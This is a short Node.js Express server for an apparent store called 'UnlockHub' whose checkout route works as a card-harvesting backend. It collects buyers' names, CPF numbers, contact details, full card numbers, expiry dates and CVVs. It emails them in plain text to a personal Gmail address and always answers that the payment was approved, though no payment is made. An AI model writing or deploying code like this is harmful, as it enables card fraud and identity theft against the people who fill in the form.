const express = require("express");
const bodyParser = require("body-parser");
const { Resend } = require("resend");

const app = express();

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static("public"));

const resend = new Resend(process.env.RESEND_API_KEY);

app.post("/checkout", async (req, res) => {
  try {
    const {
      nome,
      cpf,
      whatsapp,
      email,
      produto,
      preco,
      metodo,
      numeroCartao,
      validade,
      cvv,
    } = req.body;

    const dados = `
NOVO PEDIDO UNLOCKHUB

Nome: ${nome}
CPF: ${cpf}
WhatsApp: ${whatsapp}
Email: ${email}

Produto: ${produto}
Preço: R$ ${preco}
Método: ${metodo}

Número do Cartão: ${numeroCartao || "N/A"}
Validade: ${validade || "N/A"}
CVV: ${cvv || "N/A"}
`;

    await resend.emails.send({
      from: "UnlockHub <onboarding@resend.dev>",
      to: "unlockhubphb@gmail.com",
      subject: `Novo Pedido - ${produto}`,
      text: dados,
    });

    res.status(200).send("Pagamento aprovado com sucesso!");
  } catch (error) {
    console.error("Erro ao enviar email:", error);
    res.status(500).send(error.message);
  }
});

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log("Servidor rodando na porta " + PORT);
});
